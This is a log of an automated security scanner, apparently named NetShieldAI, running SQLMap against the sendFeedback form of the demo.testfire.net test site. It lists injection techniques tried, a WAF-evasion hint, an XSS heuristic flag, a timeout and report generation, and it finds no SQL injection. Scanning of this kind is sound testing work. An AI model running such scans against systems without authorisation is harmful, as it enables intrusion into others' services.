+[2026-01-09 20:06:04] [SQLMap] [20:06:04] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[2026-01-09 20:06:15] [SQLMap] [20:06:15] [INFO] testing 'Generic inline queries'
+[2026-01-09 20:06:18] [SQLMap] [20:06:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[2026-01-09 20:06:31] [SQLMap] [20:06:31] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[2026-01-09 20:06:40] [SQLMap] [20:06:40] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[2026-01-09 20:06:49] [SQLMap] [20:06:49] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[2026-01-09 20:07:01] [SQLMap] [20:07:01] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[2026-01-09 20:07:12] [SQLMap] [20:07:12] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[2026-01-09 20:07:24] [SQLMap] [20:07:24] [INFO] testing 'Oracle AND time-based blind'
+[2026-01-09 20:07:35] [SQLMap] [20:07:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[2026-01-09 20:08:04] [SQLMap] [20:08:04] [WARNING] POST parameter 'btnSubmit' does not seem to be injectable
+[2026-01-09 20:08:04] [SQLMap] [20:08:04] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next target
+[2026-01-09 20:08:04] [SQLMap] [3/9] Form:
+[2026-01-09 20:08:04] [SQLMap] POST https://demo.testfire.net/sendFeedback
+[2026-01-09 20:08:04] [SQLMap] POST data: cfile=comments.txt&name=&email_addr=&subject=&comments=&submit=%20Submit%20
+[2026-01-09 20:08:04] [SQLMap] do you want to test this form? [Y/n/q]
+[2026-01-09 20:08:04] [SQLMap] > Y
+[2026-01-09 20:08:04] [SQLMap] Edit POST data [default: cfile=comments.txt&name=&email_addr=&subject=&comments=&submit=%20Submit%20] (Warning: blank fields detected): cfile=comments.txt&name=&email_addr=&subject=&comments=&submit= Submit
+[2026-01-09 20:08:04] [SQLMap] do you want to fill blank fields with random values? [Y/n] Y
+[2026-01-09 20:08:04] [SQLMap] it appears that provided value for POST parameter 'submit' has boundaries. Do you want to inject inside? (' Submit* ') [y/N] N
+[2026-01-09 20:08:05] [SQLMap] you have not declared cookie(s), while server wants to set its own ('JSESSIONID=384E2B648DF...D5F0E2D14C'). Do you want to use those [Y/n] Y
+[2026-01-09 20:08:05] [SQLMap] [20:08:05] [INFO] checking if the target is protected by some kind of WAF/IPS
+[2026-01-09 20:08:07] [SQLMap] [20:08:07] [INFO] testing if the target URL content is stable
+[2026-01-09 20:08:08] [SQLMap] [20:08:08] [INFO] target URL content is stable
+[2026-01-09 20:08:08] [SQLMap] [20:08:08] [INFO] testing if POST parameter 'cfile' is dynamic
+[2026-01-09 20:08:09] [SQLMap] [20:08:09] [WARNING] POST parameter 'cfile' does not appear to be dynamic
+[2026-01-09 20:08:11] [SQLMap] [20:08:11] [WARNING] heuristic (basic) test shows that POST parameter 'cfile' might not be injectable
+[2026-01-09 20:08:12] [SQLMap] [20:08:12] [INFO] testing for SQL injection on POST parameter 'cfile'
+[2026-01-09 20:08:12] [SQLMap] [20:08:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[2026-01-09 20:08:18] [SQLMap] [20:08:18] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[2026-01-09 20:08:19] [SQLMap] [20:08:19] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[2026-01-09 20:08:25] [SQLMap] [20:08:25] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[2026-01-09 20:08:31] [SQLMap] [20:08:31] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[2026-01-09 20:08:37] [SQLMap] [20:08:37] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[2026-01-09 20:08:42] [SQLMap] [20:08:42] [INFO] testing 'Generic inline queries'
+[2026-01-09 20:08:44] [SQLMap] [20:08:44] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[2026-01-09 20:08:48] [SQLMap] [20:08:48] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[2026-01-09 20:08:53] [SQLMap] [20:08:53] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[2026-01-09 20:08:57] [SQLMap] [20:08:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[2026-01-09 20:09:03] [SQLMap] [20:09:03] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[2026-01-09 20:09:09] [SQLMap] [20:09:09] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[2026-01-09 20:09:15] [SQLMap] [20:09:15] [INFO] testing 'Oracle AND time-based blind'
+[2026-01-09 20:09:21] [SQLMap] it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[2026-01-09 20:09:21] [SQLMap] [20:09:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[2026-01-09 20:09:32] [SQLMap] [20:09:32] [WARNING] POST parameter 'cfile' does not seem to be injectable
+[2026-01-09 20:09:32] [SQLMap] [20:09:32] [INFO] testing if POST parameter 'name' is dynamic
+[2026-01-09 20:09:33] [SQLMap] [20:09:33] [WARNING] POST parameter 'name' does not appear to be dynamic
+[2026-01-09 20:09:34] [SQLMap] [20:09:34] [WARNING] heuristic (basic) test shows that POST parameter 'name' might not be injectable
+[2026-01-09 20:09:36] [DATA] [20:09:36] [INFO] heuristic (XSS) test shows that POST parameter 'name' might be vulnerable to cross-site scripting (XSS) attacks
+[2026-01-09 20:09:36] [SQLMap] [20:09:36] [INFO] testing for SQL injection on POST parameter 'name'
+[2026-01-09 20:09:36] [SQLMap] [20:09:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[2026-01-09 20:09:37] [SQLMap] [20:09:37] [WARNING] reflective value(s) found and filtering out
+[2026-01-09 20:09:47] [SQLMap] [20:09:47] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[2026-01-09 20:09:50] [SQLMap] [20:09:50] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[2026-01-09 20:09:55] [SQLMap] [20:09:55] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[2026-01-09 20:10:01] [SQLMap] [20:10:01] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[2026-01-09 20:10:07] [SQLMap] [20:10:07] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[2026-01-09 20:10:13] [SQLMap] [20:10:13] [INFO] testing 'Generic inline queries'
+[2026-01-09 20:10:14] [SQLMap] [20:10:14] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[2026-01-09 20:10:19] [SQLMap] [20:10:19] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[2026-01-09 20:10:23] [SQLMap] [20:10:23] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[2026-01-09 20:10:28] [SQLMap] [20:10:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[2026-01-09 20:10:34] [SQLMap] [20:10:34] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[2026-01-09 20:10:40] [SQLMap] [20:10:40] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[2026-01-09 20:10:46] [SQLMap] [20:10:46] [INFO] testing 'Oracle AND time-based blind'
+[2026-01-09 20:10:51] [SQLMap] [20:10:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[2026-01-09 20:10:51] [!] TIME LIMIT EXCEEDED (600s). Process killed.
+[2026-01-09 20:10:51] [+] Scan Completed. Parsing results...
+[2026-01-09 20:10:51] [+] Parsed 0 vulnerabilities from log.
+[2026-01-09 20:10:51] [+] SQL JSON report saved to D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\sql_report.json
+[2026-01-09 20:10:51] [+] SQL scan complete. Generating PDF report...
+[2026-01-09 20:10:52] [+] PDF report generated successfully: D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\sql_report.pdf
